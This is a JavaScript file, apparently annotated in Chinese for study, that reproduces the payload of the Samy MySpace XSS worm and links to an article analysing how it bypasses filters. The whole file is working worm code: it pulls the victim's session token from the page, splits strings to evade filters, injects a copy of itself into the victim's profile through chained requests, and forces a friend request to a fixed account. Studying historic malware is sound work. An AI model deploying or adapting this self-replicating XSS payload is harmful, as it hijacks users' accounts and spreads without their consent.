// Samy Worm提取出来的payload
// 绕过手法分析文章：https://blog.csdn.net/z646683869/article/details/115561856

var B = String.fromCharCode(34);
var A = String.fromCharCode(39);

// 获取innerHTML
function g() {
    var C;
    try {
        var D = document.body.createTextRange();
        C = D.htmlText
    } catch (e) {
    }

    if (C) {
        return C
    } else {
        return eval('document.body.inne' + 'rHTML')
    }
}

// 从URL获取ID和token
function getData(AU) {
    M = getFromURL(AU, 'friendID');
    L = getFromURL(AU, 'Mytoken')
}

// 获取location中的每个参数
function getQueryParams() {
    var E = document.location.search;
    var F = E.substring(1, E.length).split('&');
    var AS = new Array();
    for (var O = 0; O < F.length; O++) {
        var I = F[O].split('=');
        AS[I[0]] = I[1]
    } return AS
}

var J;          // XMLHttpRequest对象
var AS = getQueryParams();
var L = AS['Mytoken'];
var M = AS['friendID'];
if (location.hostname == 'profile.myspace.com') {
    document.location = 'http://www.myspace.com' + location.pathname + location.search
} else {
    if (!M) {
        getData(g())
    }
    main()
}

// 在InnerHTML中查找模式up_launchIC('，并返回其值
function getClientFID() {
    return findIn(g(), 'up_launchIC( ' + A, A)
}

function nothing() { }

// 将传入的参数列表AV转换为字符串
function paramsToString(AV) {
    var N = new String();
    var O = 0;
    for (var P in AV) {
        if (O > 0) {
            N += '&'
        }
        var Q = escape(AV[P]);
        while (Q.indexOf('+') != -1) {
            Q = Q.replace('+', '%2B')
        }
        while (Q.indexOf('&') != -1) {
            Q = Q.replace('&', '%26')
        }
        N += P + '=' + Q;
        O++
    }
    return N
}

// 将BI作为XMLHttpRequest的回调，BJ为请求的方法（POST GET），BH为请求的host，BK为发送的长度，发送HTTP请求
function httpSend(BH, BI, BJ, BK) {
    if (!J) {
        return false
    }
    eval('J.onr' + 'eadystatechange=BI');
    J.open(BJ, BH, true);
    if (BJ == 'POST') {
        J.setRequestHeader('ContentType', 'application / x - www - form - urlencoded');
        J.setRequestHeader('ContentLength', BK.length)
    }
    J.send(BK);
    return true
}

// 在BF中查找BB对应的值，以BC为分隔符，最后返回该值
function findIn(BF, BB, BC) {
    var R = BF.indexOf(BB) + BB.length;
    var S = BF.substring(R, R + 1024);
    return S.substring(0, S.indexOf(BC))
}

// 在BF中查找'name="BG"value="'的模式，其中BG为传入的name参数，返回其value值
function getHiddenParameter(BF, BG) {
    return findIn(BF, 'name=' + B + BG + B + 'value = ' + B, B)
}

// 获取innerHTML中的BG对应值
function getFromURL(BF, BG) {
    var T;
    if (BG == 'Mytoken') {
        T = B
    } else {
        T = '&'
    }
    var U = BG + '=';
    var V = BF.indexOf(U) + U.length;
    var W = BF.substring(V, V + 1024);
    var X = W.indexOf(T);
    var Y = W.substring(0, X);
    return Y
}

// 获取XMLHttpRequest对象
function getXMLObj() {
    var Z = false;
    if (window.XMLHttpRequest) {
        try {
            Z = new XMLHttpRequest()
        } catch (e) {
            Z = false
        }
    } else if (window.ActiveXObject) {
        try {
            Z = new
                ActiveXObject('Msxml2.XMLHTTP')
        } catch (e) {
            try {
                Z = new
                    ActiveXObject('Microsoft.XMLHTTP')
            } catch (e) {
                Z = false
            }
        }
    }
    return Z
}

var AA = g();
var AB = AA.indexOf('m' + 'ycode');
var AC = AA.substring(AB, AB + 4096);
var AD = AC.indexOf('D' + 'IV');
var AE = AC.substring(0, AD);
var AF;
if (AE) {
    AE = AE.replace('jav' + 'a', A + 'jav' + 'a');
    AE = AE.replace('exp' + 'r)', 'exp' + 'r)' + A);
    AF = ' but most of all, samy is my hero. < d' + 'iv id = ' + AE + 'D' + 'IV > '
}
var AG;

function getHome() {
    if (J.readyState != 4) {
        return
    }
    var AU = J.responseText;
    AG = findIn(AU, 'P' + 'rofileHeroes', '</td > ');
    AG = AG.substring(61, AG.length);
    if (AG.indexOf('samy') == -1) {
        if (AF) {
            AG += AF;
            var AR = getFromURL(AU, 'Mytoken');
            var AS = new Array();
            AS['interestLabel'] = 'heroes';
            AS['submit'] = 'Preview';
            AS['interest'] = AG;
            J = getXMLObj();
            httpSend('/index.cfm?fuseaction = profile.previewInterests & Mytoken='
                + AR, postHero,
                'POST', paramsToString(AS))
        }
    }
}

// 
function postHero() {
    if (J.readyState != 4) {
        return
    }
    var AU = J.responseText;
    var AR = getFromURL(AU, 'Mytoken');
    var AS = new Array();
    AS['interestLabel'] = 'heroes';
    AS['submit'] = 'Submit';
    AS['interest'] = AG;
    AS['hash'] = getHiddenParameter(AU, 'hash');
    httpSend('/index.cfm?fuseaction = profile.processInterests & Mytoken='
        + AR, nothing,
        'POST', paramsToString(AS))
}

function main() {
    var AN = getClientFID();    // 从innerHTML中获取up_launchIC函数的参数
    var BH = '/index.cfm?fuseaction = user.viewProfile & friendID=' + AN + '&Mytoken=' + L;
    J = getXMLObj();
    httpSend(BH, getHome, 'GET');  // 调用链： 发送user.viewProfile -> 回调getHome发送profile.previewInterests -> 回调postHero调用profile.processInterests
    xmlhttp2 = getXMLObj();
    httpSend2('/index.cfm?fuseaction = invite.addfriend_verify & friendID=11851658 &Mytoken=' + L, processxForm, 'GET')
                                   // 调用链： 发送invite.addfriend_verify -> 回调processxForm发送invite.addFriendsProcess
}

function processxForm() {
    if (xmlhttp2.readyState != 4) {
        return
    }
    var AU = xmlhttp2.responseText;
    var AQ = getHiddenParameter(AU, 'hashcode');
    var AR = getFromURL(AU, 'Mytoken');
    var AS = new Array();
    AS['hashcode'] = AQ;
    AS['friendID'] = '11851658';
    AS['submit'] = 'Add to Friends';
    httpSend2('/index.cfm?fuseaction = invite.addFriendsProcess & Mytoken=' + AR, nothing, 'POST', paramsToString(AS))
}

// 与httpSend基本相同，只是使用的XMLHttpRequest对象不同
function httpSend2(BH, BI, BJ, BK) {
    if (!xmlhttp2) {
        return false
    }
    eval('xmlhttp2.onr' + 'eadystatechange=BI');
    xmlhttp2.open(BJ, BH, true);
    if (BJ == 'POST') {
        xmlhttp2.setRequestHeader('ContentType', 'application / x - www - form - urlencoded');
        xmlhttp2.setRequestHeader('Content-Length', BK.length)
    }
    xmlhttp2.send(BK);
    return true
}